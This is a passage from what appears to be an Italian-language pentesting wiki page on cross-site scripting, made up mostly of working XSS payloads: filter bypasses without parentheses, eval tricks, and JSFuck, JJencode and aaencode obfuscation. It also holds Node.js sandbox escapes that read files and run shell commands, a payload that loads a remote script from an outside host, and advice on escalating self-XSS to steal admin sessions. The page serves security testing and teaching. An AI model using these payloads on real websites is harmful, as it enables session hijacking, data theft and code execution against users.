//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript all'interno di un commento**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript senza parentesi**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Chiamata arbitraria di funzione (alert)**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM vulnerabilities**

Esiste del **JS code** che utilizza **dati gestiti in modo non sicuro da un attacker** come `location.href`. Un attacker potrebbe abusarne per eseguire codice JS arbitrario.\
**A causa dell'estensione della spiegazione di** [**DOM vulnerabilities it was moved to this page**](dom-xss.md)**:**


{{#ref}}
dom-xss.md
{{#endref}}

Lì troverai una **spiegazione dettagliata di cosa sono le DOM vulnerabilities, come vengono provocate e come sfruttarle**.\
Inoltre, non dimenticare che **alla fine del post citato** puoi trovare una spiegazione su [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering).

### Escalation di Self-XSS

### Cookie XSS

Se riesci a triggerare una XSS inviando il payload all'interno di un cookie, di solito si tratta di una self-XSS. Tuttavia, se trovi un **vulnerable subdomain to XSS**, potresti abusare di questa XSS per iniettare un cookie in tutto il dominio riuscendo a triggerare la cookie XSS nel dominio principale o in altri subdomains (quelli vulnerabili a cookie XSS). Per questo puoi usare il cookie tossing attack:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

You can find a great abuse of this technique in [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html).

### Sending your session to the admin

Forse un user può condividere il suo profilo con l'admin e se la self XSS si trova nel profilo dell'user e l'admin lo accede, quest'ultimo attiverà la vulnerabilità.

### Session Mirroring

Se trovi una self XSS e la pagina web ha un **session mirroring for administrators**, ad esempio permettendo ai client di chiedere aiuto in modo che l'admin possa vedere ciò che vedi nella tua session ma dalla sua session,

Potresti far sì che l'**administrator trigger your self XSS** e rubare i suoi cookies/session.

## Altri Bypass

### Bypassing sanitization via WASM linear-memory template overwrite

Quando un'app web usa Emscripten/WASM, le stringhe costanti (come gli HTML format stubs) risiedono nella linear memory scrivibile. Un singolo overflow in‑WASM (es. memcpy non controllato in un percorso di editing) può corrompere strutture adiacenti e reindirizzare le scritture verso quelle costanti. Sovrascrivere un template come "<article><p>%.*s</p></article>" con "<img src=1 onerror=%.*s>" trasforma l'input sanitizzato in un valore di handler JavaScript e produce una DOM XSS immediata al render.

Controlla la pagina dedicata con workflow di exploitation, DevTools memory helpers e contromisure:

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Normalised Unicode

Puoi verificare se i **reflected values** vengono **unicode normalized** sul server (o lato client) e abusare di questa funzionalità per bypassare le protezioni. [**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

A causa di **RoR mass assignment** le virgolette vengono inserite nell'HTML e quindi la restrizione delle virgolette viene bypassata e campi aggiuntivi (onfocus) possono essere aggiunti all'interno del tag.\
Esempio di form ([from this report](https://hackerone.com/reports/709336)), se invii il payload:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
La coppia "Key","Value" verrà restituita così:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
Successivamente, l'attributo onfocus verrà inserito e si verifica XSS.

### Combinazioni speciali
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS con header injection in una 302 response

Se scopri che puoi **inject headers in a 302 Redirect response** puoi provare a **far eseguire al browser JavaScript arbitrario**. Questo non è **banale** perché i browser moderni non interpretano il body della risposta HTTP se lo status code è 302, quindi un semplice payload di cross-site scripting è inutile.

In [**questa relazione**](https://www.gremwell.com/firefox-xss-302) e [**questa**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) puoi leggere come testare diversi protocolli dentro il Location header e vedere se qualcuno di essi permette al browser di ispezionare ed eseguire il payload XSS dentro il body.\
Past known protocols: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### Solo Lettere, Numeri e Punti

Se sei in grado di indicare il **callback** che javascript eseguirà limitandolo a quei caratteri. [**Leggi questa sezione di questo post**](#javascript-function) per scoprire come abusare di questo comportamento.

### Valid `<script>` Content-Types to XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) If you try to load a script with a **content-type** such as `application/octet-stream`, Chrome will throw following error:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

The only **Content-Type**s that will support Chrome to run a **loaded script** are the ones inside the const **`kSupportedJavascriptTypes`** from [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Tipi di script per XSS

(Da [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Quindi, quali tipi potrebbero essere indicati per caricare uno script?
```html
<script type="???"></script>
```
La risposta è:

- **module** (predefinito, niente da spiegare)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles è una funzionalità che permette di raggruppare diversi dati (HTML, CSS, JS…) in un file **`.wbn`**.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** Consente di migliorare la sintassi degli import
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
Questo comportamento è stato utilizzato in [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) per rimappare una libreria su eval; abusandone può scatenare XSS.

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Questa funzionalità serve principalmente a risolvere alcuni problemi causati dal pre-rendering. Funziona così:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Web Content-Types per XSS

(Da [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) I seguenti content types possono eseguire XSS in tutti i browser:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? not in the list but I think I saw this in a CTF)
- application/rss+xml (off)
- application/atom+xml (off)

In altri browser altri **`Content-Types`** possono essere usati per eseguire JS arbitrario, vedi: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Content Type

Se la pagina restituisce un content-type text/xml è possibile indicare un namespace ed eseguire JS arbitrario:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Pattern speciali di sostituzione

Quando viene usato qualcosa come **`"some {{template}} data".replace("{{template}}", <user_input>)`**. L'attaccante potrebbe usare [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement) per cercare di bypassare alcune protezioni: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

Ad esempio in [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA), questo è stato usato per eseguire l'escape di una stringa JSON all'interno di uno script ed eseguire codice arbitrario.

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

Se hai a disposizione solo un insieme limitato di caratteri, controlla queste altre soluzioni valide per problemi XSJail:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
Se **tutto è undefined** prima di eseguire codice non attendibile (come in [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)) è possibile generare oggetti utili "dal nulla" per abusare dell'esecuzione di codice arbitrario non attendibile:

- Usando import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- Accesso indiretto a `require`

[Secondo questo](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) i moduli sono incapsulati da Node.js all'interno di una funzione, come segue:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
Pertanto, se da quel modulo possiamo **chiamare un'altra funzione**, è possibile usare `arguments.callee.caller.arguments[1]` da quella funzione per accedere a **`require`**:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
In modo simile all'esempio precedente, è possibile **use error handlers** per accedere al **wrapper** del modulo e ottenere la funzione **`require`**:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuscation & Advanced Bypass

- **Diverse obfuscations in una pagina:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- JSFuck più sofisticato: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
